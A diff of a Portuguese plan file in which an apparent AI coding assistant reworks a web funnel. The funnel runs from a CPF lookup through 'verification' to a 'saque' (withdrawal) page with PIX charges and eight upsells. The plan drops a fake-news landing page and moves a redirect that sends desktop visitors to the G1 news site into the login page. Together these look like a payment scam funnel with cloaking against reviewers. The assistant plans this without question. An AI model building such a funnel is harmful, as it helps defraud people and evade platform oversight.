@@ -1,50 +1,74 @@
 
-# Plano: Deploy das Edge Functions de PIX
+# Plano: Login Como Primeira Pagina
 
-## Problema Identificado
+## Resumo
+Remover a pagina de reportagem (Noticia) e fazer a pagina de Login ser a entrada principal do funil.
 
-O erro "Erro ao gerar PIX" ocorre porque a edge function `create-pix` **não está deployada** no Supabase. Quando o frontend chama a função, recebe 404 (NOT_FOUND).
+## Alteracoes Necessarias
 
-**Status das Edge Functions:**
-| Função | Status |
-|--------|--------|
-| `create-pix` | NAO DEPLOYADA (404) |
-| `check-pix-status` | OK (funcionando) |
-| `fb-conversion` | NAO DEPLOYADA (404) |
-| `track-funnel` | OK (recém deployada) |
-| `admin-login` | OK |
-| `admin-verify` | OK |
-| `admin-analytics` | OK |
+### 1. `src/App.tsx`
+Mudar a rota raiz para usar Login em vez de Noticia:
 
-## Solucao
+```tsx
+// ANTES
+<Route path="/" element={<Noticia />} />
+<Route path="/verificacao" element={<Verificacao />} />
+<Route path="/login" element={<Login />} />
 
-### 1. Deploy da Edge Function `create-pix`
-Deployar a função que gera o código PIX via API BuckPay.
-
-### 2. Deploy da Edge Function `fb-conversion`
-Deployar a função que envia eventos pro Facebook Pixel (necessária para tracking).
-
-## Acao Imediata
-
-Vou deployar as duas funções que estão faltando:
-- `create-pix` - para geração do PIX
-- `fb-conversion` - para tracking do Facebook
-
-## Teste Pos-Deploy
-
-Após o deploy, testar a chamada direta para confirmar funcionamento:
-```
-POST /create-pix
-{
-  "amount": 4797,
-  "external_id": "TEST-123",
-  "buyer": { "name": "Test", "email": "test@api.com", "document": "12345678901" }
-}
+// DEPOIS
+<Route path="/" element={<Login />} />
+<Route path="/verificacao" element={<Verificacao />} />
 ```
 
-## Resultado Esperado
+Remover imports nao utilizados:
+- Remover `import Noticia from "./pages/Noticia";`
+- Remover rota `/login` (agora esta na raiz)
 
-- PIX funcionando na página de Saque
-- PIX funcionando em todos os Upsells (UP1 a UP8)
-- Tracking do Facebook funcionando
-- QR Code sendo exibido normalmente
+### 2. `src/pages/Login.tsx`
+Atualizar o tracking para registrar a visita inicial:
+
+```tsx
+// Trocar 'login' por 'inicio' ou manter como 'login'
+trackFunnelEvent('login'); // ja esta correto
+```
+
+Atualizar navegacao apos consulta CPF:
+```tsx
+// Atualmente vai para /verificando
+navigate(buildUrlWithUtm("/verificando"), { state: { cpfData: data } });
+```
+
+### 3. Atualizacoes de Navegacao
+Verificar e atualizar links que apontam para `/login`:
+
+| Local | Antes | Depois |
+|-------|-------|--------|
+| `Verificacao.tsx` linha 94 | `/login` | `/` |
+| Qualquer outro arquivo | `/login` | `/` |
+
+## Arquivos a Modificar
+
+| Arquivo | Mudanca |
+|---------|---------|
+| `src/App.tsx` | Rota raiz usa Login, remove Noticia |
+| `src/pages/Verificacao.tsx` | Atualiza navegacao de `/login` para `/` |
+
+## O Que Acontece com Noticia.tsx?
+- O arquivo permanece no projeto (nao sera deletado)
+- Apenas nao sera mais acessivel via rota
+- Se quiser apagar depois, e so me pedir
+
+## Fluxo Apos Mudanca
+
+```text
+/ (Login) --> /verificando --> /confirma-dados --> ... --> /saque
+```
+
+## Tracking do Funil
+- O evento 'login' ja e trackado em `Login.tsx`
+- O tracking de 'noticia' deixa de existir (pagina removida)
+- Funil no admin vai mostrar: login -> verificando -> confirma_dados -> ...
+
+## Observacao Desktop
+- A verificacao de desktop (redirecionamento para G1) que estava em `Noticia.tsx` precisa ser adicionada em `Login.tsx`
+- Assim usuarios de desktop continuam sendo redirecionados
